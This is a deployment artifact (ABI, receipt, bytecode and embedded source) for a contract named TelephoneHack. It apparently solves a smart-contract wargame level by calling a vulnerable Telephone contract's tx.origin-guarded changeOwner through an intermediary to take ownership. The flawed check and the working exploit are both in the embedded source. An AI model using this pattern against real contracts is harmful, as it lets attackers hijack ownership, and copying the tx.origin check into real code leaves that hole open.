@@ -1,0 +1,90 @@
+{
+  "address": "0x1BfD6C90e049FcB5a52BC25F8b614eD70a56Ea1E",
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "contract Telephone",
+          "name": "telephone_",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    },
+    {
+      "inputs": [],
+      "name": "hack",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "telephone",
+      "outputs": [
+        {
+          "internalType": "contract Telephone",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    }
+  ],
+  "transactionHash": "0x8dc2a89562cbdc92b39eb059cebc2e9ef60b1e68d57b27be3e9cc12303efbb8f",
+  "receipt": {
+    "to": null,
+    "from": "0x666e416d73609f61C60d8A844066A0d956805118",
+    "contractAddress": "0x1BfD6C90e049FcB5a52BC25F8b614eD70a56Ea1E",
+    "transactionIndex": 8,
+    "gasUsed": "120616",
+    "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000020000000000000008000000000000000000000000000000000800000000000000000000100000000000000000000200000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000080000000000000000000000000000000000000000004000000000000000000001000000000100000000000000000000100000000000000000000000000100000000000000000000000000000000000000000000100000",
+    "blockHash": "0xa9a41f97ccedce95b95cda57f4fc5d44dce4c2fc7bbdceb8c27a672d0a36c139",
+    "transactionHash": "0x8dc2a89562cbdc92b39eb059cebc2e9ef60b1e68d57b27be3e9cc12303efbb8f",
+    "logs": [
+      {
+        "transactionIndex": 8,
+        "blockNumber": 32818998,
+        "transactionHash": "0x8dc2a89562cbdc92b39eb059cebc2e9ef60b1e68d57b27be3e9cc12303efbb8f",
+        "address": "0x0000000000000000000000000000000000001010",
+        "topics": [
+          "0x4dfe1bbbcf077ddc3e01291eea2d5c70c2b422b415d95645b9adcfd678cb1d63",
+          "0x0000000000000000000000000000000000000000000000000000000000001010",
+          "0x000000000000000000000000666e416d73609f61c60d8a844066a0d956805118",
+          "0x0000000000000000000000003a22c8bc68e98b0faf40f349dd2b2890fae01484"
+        ],
+        "data": "0x0000000000000000000000000000000000000000000000000000cf3f032b316800000000000000000000000000000000000000000000000002a14184186192e100000000000000000000000000000000000000000000035a8f6711de4954a55000000000000000000000000000000000000000000000000002a072451536617900000000000000000000000000000000000000000000035a8f67e11d4c7fd6b8",
+        "logIndex": 19,
+        "blockHash": "0xa9a41f97ccedce95b95cda57f4fc5d44dce4c2fc7bbdceb8c27a672d0a36c139"
+      }
+    ],
+    "blockNumber": 32818998,
+    "cumulativeGasUsed": "5493469",
+    "status": 1,
+    "byzantium": true
+  },
+  "args": [
+    "0xe350Ff70BbF9dB9608Fc1a4BB2796688c8B44Bff"
+  ],
+  "numDeployments": 1,
+  "solcInputHash": "a05c167b72b9681a1ab2a5e235413181",
+  "metadata": "{\"compiler\":{\"version\":\"0.8.12+commit.f00d7308\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"contract Telephone\",\"name\":\"telephone_\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"hack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"telephone\",\"outputs\":[{\"internalType\":\"contract Telephone\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/TelephoneHack.sol\":\"TelephoneHack\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Telephone.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity 0.8.12;\\n\\ncontract Telephone {\\n    address public owner;\\n\\n    constructor() {\\n        owner = msg.sender;\\n    }\\n\\n    function changeOwner(address _owner) public {\\n        if (tx.origin != msg.sender) {\\n            owner = _owner;\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0x1a7bc8dadcbc7ee9b8ef396809ba003b2b838349fbc47a567bc144c0482f0bfa\",\"license\":\"MIT\"},\"contracts/TelephoneHack.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity 0.8.12;\\n\\nimport \\\"./Telephone.sol\\\";\\n\\ncontract TelephoneHack {\\n    Telephone public immutable telephone;\\n\\n    constructor(Telephone telephone_) {\\n        telephone = telephone_;\\n    }\\n\\n    function hack() external {\\n        telephone.changeOwner(msg.sender);\\n    }\\n}\\n\",\"keccak256\":\"0x18716ebb76f7e78463824167ab9f0ee03cb2c998c2d5091a1dd2ba21681f37fe\",\"license\":\"MIT\"}},\"version\":1}",
+  "bytecode": "0x60a060405234801561001057600080fd5b506040516101c03803806101c083398101604081905261002f91610040565b6001600160a01b0316608052610070565b60006020828403121561005257600080fd5b81516001600160a01b038116811461006957600080fd5b9392505050565b6080516101306100906000396000818160430152609601526101306000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c80634de260a214603757806393acaa5914603f575b600080fd5b603d6081565b005b60657f000000000000000000000000000000000000000000000000000000000000000081565b6040516001600160a01b03909116815260200160405180910390f35b60405163a6f9dae160e01b81523360048201527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03169063a6f9dae190602401600060405180830381600087803b15801560e157600080fd5b505af115801560f4573d6000803e3d6000fd5b5050505056fea26469706673582212208f8dda7b4e695aaf84f2afc1477cca1bab838990f0e87892f31a98b960241f7c64736f6c634300080c0033",
+  "deployedBytecode": "0x6080604052348015600f57600080fd5b506004361060325760003560e01c80634de260a214603757806393acaa5914603f575b600080fd5b603d6081565b005b60657f000000000000000000000000000000000000000000000000000000000000000081565b6040516001600160a01b03909116815260200160405180910390f35b60405163a6f9dae160e01b81523360048201527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03169063a6f9dae190602401600060405180830381600087803b15801560e157600080fd5b505af115801560f4573d6000803e3d6000fd5b5050505056fea26469706673582212208f8dda7b4e695aaf84f2afc1477cca1bab838990f0e87892f31a98b960241f7c64736f6c634300080c0033",
+  "devdoc": {
+    "kind": "dev",
+    "methods": {},
+    "version": 1
+  },
+  "userdoc": {
+    "kind": "user",
+    "methods": {},
+    "version": 1
+  },
+  "storageLayout": {
+    "storage": [],
+    "types": null
+  }
+}
